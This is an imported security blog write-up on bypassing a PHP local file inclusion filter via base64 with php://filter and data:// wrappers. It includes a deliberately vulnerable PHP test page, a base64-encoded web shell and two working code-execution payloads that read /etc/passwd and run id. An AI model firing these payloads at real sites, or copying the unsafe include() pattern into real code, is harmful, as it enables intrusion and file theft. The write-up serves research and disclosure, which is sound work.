---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-07-20_one-lfi-bypass-to-rule-them-all-using-base64.md
original_filename: 2023-07-20_one-lfi-bypass-to-rule-them-all-using-base64.md
title: One LFI bypass to rule them all (using base64)
category: documents
detected_topics:
- command-injection
- file-upload
- path-traversal
- mobile-security
- supply-chain
tags:
- imported
- documents
- command-injection
- file-upload
- path-traversal
- mobile-security
- supply-chain
language: en
raw_sha256: ba9fb1e804a50619fe7d29f36f0eaa16051b80b7c366dd91a22f2985d1d35eb1
text_sha256: c26714f47e036a57acbd9029e8beaea465fc0edea040b0f1ecf94fd377b9f98f
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: false
---

# One LFI bypass to rule them all (using base64)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-07-20_one-lfi-bypass-to-rule-them-all-using-base64.md
- Source Type: markdown
- Detected Topics: command-injection, file-upload, path-traversal, mobile-security, supply-chain
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: False
- Raw SHA256: `ba9fb1e804a50619fe7d29f36f0eaa16051b80b7c366dd91a22f2985d1d35eb1`
- Text SHA256: `c26714f47e036a57acbd9029e8beaea465fc0edea040b0f1ecf94fd377b9f98f`


## Content

---
title: "One LFI bypass to rule them all (using base64)"
page_title: "One LFI bypass to rule them all (using base64) - Matan-h"
url: "https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/"
final_url: "https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/"
authors: ["matan-h"]
bugs: ["LFI"]
publication_date: "2023-07-20"
added_date: "2023-07-24"
source: "pentester.land/writeups.json"
original_index: 911
---

#  [One LFI bypass to rule them all (using base64) ](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)

__4 minute read

## Backstory:

On one of the [real world] PHP websites, I found an [LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion) [there was a URL parameter that checked if the value ends with ‘txt’. If so, it would just display it]. So, I reported to the site owner that I have a RCE using PHP filters (using `php://filter/convert.quoted-printable-encode/resource=data:text/plain`,`phpcode`, because HTTP was already blocked) to the owner, and he decided to just block PHP start (<?php) and end (?>) tags. So now, how can I bypass this block (no file upload on this server)?

The solution according to the book is to simply use [PHP filter chain](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters). But… I don’t really like this way of exploitation – it makes the exploit very long, and it’s completely unreadable. So let’s imagine the site URL has a length filter, or it blocks the pipe char. There must be another way to do this, right?

Basically, what PHP filter chain does is to collect characters for a Base64 string ([using PHP filter group](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) called `convert.iconv`) then base64 decode it. Maybe I could just supply the base64 and then decode it, without collecting the base64 string?

For that, I need a base64 string that’s ending with “.txt”. When I asked the Cyber king of misleading information, it gave me this:

![chatgpt answer: "just append .txt to the base64 encoded string"](/assets/images/chatgpt-asked-about-b64-endswith.webp)

ChatGPT, when asked about creating a base64 that ends with ".txt"

At first glance, this seems completely unhelpful. You can’t just add “.txt” and hope it stays base64. But a little research revealed that PHP works differently.

## Update: Create test site

Let’s create our vulnerable PHP test website: (credit for the [template](https://github.com/computer-engineer/WhiteboxPentest/blob/main/Vulnerable%20Code%20Examples/php/lfi.php) to **[WhiteboxPentest](https://github.com/computer-engineer/WhiteboxPentest)** on GitHub).

[truff](https://hackerone.com/truff) from [Projet7](https://www.projet7.org/) did some research, and he found that my exploit works only with `include` or `require` and not with `file_get_contents`. Additionally, it requires the website to be configured with `allow_url_include:On`.
  
  
  <body style="background-color:#82e2ff">
  <form method="GET">
  <label>Select Timezone</label>
  <select name="file">
  <option value="america.txt">America/New_York</option>
  <option value="asia.txt">Asia/Singapore</option>
  </select>
  <input type="submit" value="Display time"/>
  </form>
  
  <?php
  if(isset($_GET['file'])) {
  $file = $_GET['file'];
  
  // Check if the file starts with "http"
  if (strpos($file, "http") === 0) {
  echo "Files starting with 'http' are not allowed.";
  } else {
  if (strpos($file, "<?php") !== false || strpos($file, "?>") !== false || strpos($file, "|") !== false) {
  echo "blocked";
  echo (strpos($file, "|") !== false) ? " (php tag)" : " (pipe character)";
  } else {
  if (substr($file, -3) === "txt") {
  include($file);
  } else {
  echo "the file " . htmlentities($file) . " is not a txt file";
  }
  }
  
  echo "<br><br>the base64 decode was:<br>";
  echo htmlentities(base64_decode(explode(",", $file)[1]));
  echo "";
  }
  }
  ?>
  </body>
  
  

You need also to [find php.ini](https://tecadmin.net/where-is-php-ini/), and change `allow_url_include` from `Off` to `On`. Now you are ready for research: You can start the server and start to explore PHP’s base64 decode filter
  
  
  php -S 0.0.0.0:2000
  

Now go to <http://0.0.0.0:2000/vulnerable.php?file=php://filter/convert.base64-decode/resource=data://plain/text,SGVsbG8sIFdvcmxkLg>. (that should just output “the file … is not a txt file”)

* * *

Now, you can pause reading this article and try to run code yourself.

* * *

### Details

PHP has a unique way of handling base64 using the `convert.base64-decode` filter. It just ignores non-base64 characters. That means that if I try to decode this base64 string:”bWF0YW4ta&&C5j#b20K….?PHP=”

the PHP will just ignore all non-base64 characters, and decode it like it was: “bWF0YW4taC5jb20KPHP=” (decoded to be “matan-h.com<s”).

If I took a more useful example from [hacktricks](https://book.hacktricks.xyz/welcome/readme) : let’s try “PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=” (which means “<?php system($_GET[‘cmd’]);echo ‘Shell done !’; ?>”) and let’s try to make this end with “.txt” and still get a valid base64 without the dot. Turns out this is very easy : all I needed to do was to remove the padding (the `=` sign at the end) and replace it with “.txt” (you could also use other extensions such as .php, etc. as long as they can be in base64). To make the base64 more human-readable, let’s add a plus before the extension. It does not do much in the way of PHP decode base64, but if we try to decode the extension with `base64` in bash (without the “.”), it will be happy. So we get the first RCE payload:

?cmd=cat%20/etc/passwd&file=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt

![](/assets/images/PHP-filter-etc-passwd-example-com.webp)

Screenshot of the start of /etc/passwd of that site using PHP://base64-decode filter

I reported this to the owner, and he decided to just block `php://` protocol (all cases).

But the LFI was also open to the data:// protocol. In normal cases, data:// is used for plain text like this: `data://text/plain,<?php phpinfo();?>`, but data:// can also be used to decode base64. Using `data://text/plain;base64`. But this time, `data:` does not ignore non-base64 characters. Are we sure we really need them?

Apparently, the server only implements the check if the file ends with “txt“(without dot). Not with “.txt” (with dot). That means, I could just take the previous payload, remove the “.” and throw this into the `data` protocol and get the second RCE payload (for some reason, I could decode this only using PHP. Python or bash [using GNU base64] required me to add an equal sign after the “txt” to complete the padding.):

?cmd=id&file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt

![](/assets/images/data-payload-id-example-com.webp)

Screenshot of the output of the command "id" of that site using the `data://` protocol

I didn’t find this trick on Google. So I posted it here. I hope that this post informed you

Disclaimer: This article is intended for educational and informational purposes only and should not be used for any illegal or malicious activities.

**__Tags:** [base64](/tags/#base64),  [cyber](/tags/#cyber),  [php](/tags/#php),  [php-filter](/tags/#php-filter)

**__Categories:** [cyber](/categories/#cyber)

**__Updated:** July 20, 2023

#### Share on

[ __X ](https://x.com/intent/tweet?via=matanh_dev&text=One+LFI+bypass+to+rule+them+all+%28using+base64%29%20https%3A%2F%2Fmatan-h.com%2Fone-lfi-bypass-to-rule-them-all-using-base64%2F "Share on X") [ __Facebook ](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmatan-h.com%2Fone-lfi-bypass-to-rule-them-all-using-base64%2F "Share on Facebook") [ __LinkedIn ](https://www.linkedin.com/shareArticle?mini=true&url=https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/ "Share on LinkedIn") [ __Bluesky ](https://bsky.app/intent/compose?text=One+LFI+bypass+to+rule+them+all+%28using+base64%29%20https%3A%2F%2Fmatan-h.com%2Fone-lfi-bypass-to-rule-them-all-using-base64%2F "Share on Bluesky") [Previous](/google-has-a-secret-browser-hidden-inside-the-settings/ "Google has a secret browser hidden inside the settings") [Next](/how-to-set-up-a-development-environment-in-android/ "How to set up a development environment in Android")

#### Comments:  (You can also Comment directly to this discussions )
